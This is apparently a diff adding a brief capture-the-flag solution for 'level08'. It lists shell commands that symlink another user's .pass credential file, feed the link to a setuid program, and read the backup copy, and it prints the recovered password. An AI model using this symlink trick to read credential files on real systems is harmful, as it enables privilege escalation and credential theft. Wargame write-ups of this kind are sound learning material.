@@ -1,0 +1,12 @@
+solution level08:
+
+-> the program takes one filename as parameter, 
+
+
+
+
+> chmod 777 .
+> ln -s /home/users/level09/.pass pass
+> ./level08 pass
+> cat ./backups/pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
